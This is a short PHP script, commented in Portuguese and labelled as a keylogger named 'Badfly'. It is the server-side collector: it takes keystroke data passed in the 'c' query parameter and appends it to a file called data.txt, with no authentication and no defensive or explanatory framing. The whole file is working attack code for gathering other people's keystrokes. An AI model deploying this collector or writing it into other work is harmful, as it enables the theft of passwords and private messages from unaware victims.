<?php
//Keylogger php Badfly.
//Ele salva o log em um arquivo chamado data.txt

if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
